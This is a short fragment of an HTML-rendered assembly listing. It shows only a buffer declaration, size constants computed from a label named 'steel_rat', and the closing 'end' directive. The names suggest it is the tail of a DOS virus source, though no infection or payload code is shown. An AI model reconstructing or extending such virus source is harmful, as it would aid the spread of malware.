</span><span class="sc5">temp3</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Sta</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">NeededVlen</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc4">+</span><span class="sc2">1524</span><span class="sc4">)/</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">Kbmem</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc4">+</span><span class="sc2">1524</span><span class="sc4">)/</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">free</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc0">
</span></div></body>
</html>
